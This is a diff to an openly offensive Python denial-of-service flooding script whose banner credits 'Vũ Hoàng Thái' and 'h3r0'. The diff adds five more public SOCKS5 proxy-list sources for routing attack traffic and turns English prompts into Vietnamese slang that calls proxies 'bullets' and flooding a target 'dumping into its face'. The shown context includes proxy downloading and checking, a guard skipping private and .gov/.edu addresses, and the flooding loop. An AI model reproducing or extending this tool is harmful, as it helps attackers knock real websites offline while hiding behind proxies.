@@ -19,7 +19,7 @@ print('''\r\n
      |    |     |     |   |     | /   ________   \ |     |
      |____|     |_____|   |_____|/___/        \___\|_____|
  
-                               Vũ Hoàng Thái \r\n''')
+                                Vũ Hoàng Thái \r\n''')
 
 useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
             "Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
@@ -177,19 +177,44 @@ def clone():
     except:
         pass
     try:
+        r = requests.get("https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt")
+        f.write(r.content)
+    except:
+        pass
+    try:
+        r = requests.get("https://raw.githubusercontent.com/UptimerBot/proxy-list/main/proxies/socks5.txt")
+        f.write(r.content)
+    except:
+        pass
+    try:
+        r = requests.get("https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt")
+        f.write(r.content)
+    except:
+        pass
+    try:
+        r = requests.get("https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt")
+        f.write(r.content)
+    except:
+        pass
+    try:
+        r = requests.get("https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt")
+        f.write(r.content)
+    except:
+        pass
+    try:
         r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks5")
         f.write(r.content)
         f.close()
     except:
         f.close()
-    print("Socks Downloaded Sucessful !")
+    print("Nạp đạn thành công")
 
 def prevent():
     if '192.168' in ip or '127.0' in ip or '172.16' in ip or 'localhost' in ip :
-        print("Error Ip range!")
+        print("Ngáo à!")
         exit()
     if 'gov' in ip or 'edu' in ip:
-        print("Can't attack .gov or .edu website!")
+        print("Can't attack .gov or .edu website, Skid!")
         exit()
 def main():
     global ip
@@ -230,12 +255,12 @@ def main():
     else:
         th_num = int(th_num)
     #if mode == "get" or mode == "GET":
-    N = str(input("muốn tải lại socks5 ko?(y/n):"))
+    N = str(input("Muốn nạp lại đạn mới ko?(y/n):"))
     if N == "n" or N =="N":
         pass
     else:
         clone()
-    out_file = str(input("Enter Proxy File Path(socks5.txt):"))
+    out_file = str(input("Băng đạn đã mút(socks5.txt):"))
     if out_file == "":
         out_file = "socks5.txt"
     else:
@@ -243,7 +268,7 @@ def main():
     print ("Number Of Socks5 Proxies: %s" %(len(open(out_file).readlines())))
     proxies = open(out_file).readlines()
     time.sleep(0.3)
-    ans = str(input("Check the socks list?(y/n, defualt=y):"))
+    ans = str(input("Kiểm tra lại đạn?(y/n, defualt=y):"))
     if ans == "n" or ans =="N":
         pass
     else:
@@ -342,13 +367,13 @@ def check_socks():
 		th.start()
 		thread_list.append(th)
 		time.sleep(0.01)
-		sys.stdout.write("Checked "+str(nums)+" proxies\r")
+		sys.stdout.write("Đã kiểm tra "+str(nums)+" viên đạn\r")
 		sys.stdout.flush()
 	for th in list(thread_list):
 		th.join()
-		sys.stdout.write("Checked "+str(nums)+" proxies\r")
+		sys.stdout.write("Đã kiểm tra "+str(nums)+" viên đạn\r")
 		sys.stdout.flush()
-	print("\r\nChecked all proxies, Total Worked:"+str(len(proxies)))
+	print("\r\nKiểm tra đạn xong, Số đạn xịn:"+str(len(proxies)))
 	with open("socks5.txt", 'wb') as fp:
 		for lines in list(proxies):
 			fp.write(bytes(lines,encoding='utf8'))
@@ -372,7 +397,7 @@ while True:
             if n>=4:
                 n = 0
             time.sleep(0.1)
-            sys.stdout.write("["+str(key[n])+"]Flooding "+ip+page+":"+str(port)+"\r")
+            sys.stdout.write("["+str(key[n])+"]Đang xả vào mặt "+ip+":"+str(port)+" code by h3r0\r")
             sys.stdout.flush()
             n +=1
         except KeyboardInterrupt:
